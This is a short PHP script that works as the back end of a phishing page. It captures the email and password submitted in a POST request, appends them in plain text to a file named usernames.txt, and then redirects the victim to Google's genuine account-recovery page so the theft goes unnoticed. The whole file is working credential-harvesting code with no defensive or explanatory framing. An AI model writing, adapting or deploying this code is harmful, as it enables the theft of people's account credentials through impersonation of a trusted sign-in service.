<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture email and password from POST request
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    // Append to usernames.txt
    file_put_contents("usernames.txt", "Email: " . $email . " Pass: " . $password . "\n", FILE_APPEND);
    // Redirect to Google sign-in page
    header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
    exit();
}
